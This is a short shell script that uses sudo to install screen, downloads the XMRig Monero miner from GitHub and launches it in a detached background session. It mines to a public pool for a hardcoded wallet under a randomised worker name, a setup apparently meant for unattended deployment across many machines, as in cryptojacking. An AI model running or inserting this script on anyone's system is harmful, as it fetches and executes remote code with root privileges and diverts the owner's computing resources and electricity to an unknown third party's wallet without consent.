#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
tar -xf xmrig-6.18.0-linux-x64.tar.gz
cd xmrig-6.18.0
screen -dmS run ./xmrig --coin=XMR -o xmr.2miners.com:2222 -u 84kwA7y78svMqejPGdTxtLCfiSTDnRRjtWftUpXuqT9ge9ZeBk3b4XZNyo1baaBsBP1mzMKYw51pqFWLAmUcXjrgRYWcNBk.Drack-$(echo $(shuf -i 10000-99999 -n 1)) -t 4
